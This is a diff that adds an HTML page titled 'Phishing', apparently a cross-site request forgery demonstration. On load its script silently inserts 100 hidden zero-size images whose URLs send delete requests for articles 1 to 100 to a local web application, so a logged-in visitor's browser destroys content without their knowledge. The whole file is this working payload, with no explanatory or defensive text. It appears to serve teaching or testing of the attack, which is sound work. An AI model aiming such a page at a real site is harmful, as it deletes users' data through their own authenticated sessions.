@@ -1,0 +1,21 @@
+<!doctype html>
+<html>
+  <head>
+    <meta charset="utf-8"/>
+    <title>Phishing</title>
+    <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+    <script>
+      $(function() {
+        var $body = $('body');
+        (function appendEvilImage(id) {
+          if (id > 100) return;
+          $('<img/>').attr('src', 'http://localhost:8080/articles/' + id + '?_method=delete').css({width: 0, height: 0}).appendTo($body);
+          setTimeout(appendEvilImage, 0, id + 1);
+        })(1);
+      })
+    </script>
+  </head>
+  <body>
+    <h1>Welcome to the Phishing site!</h1>
+  </body>
+</html>
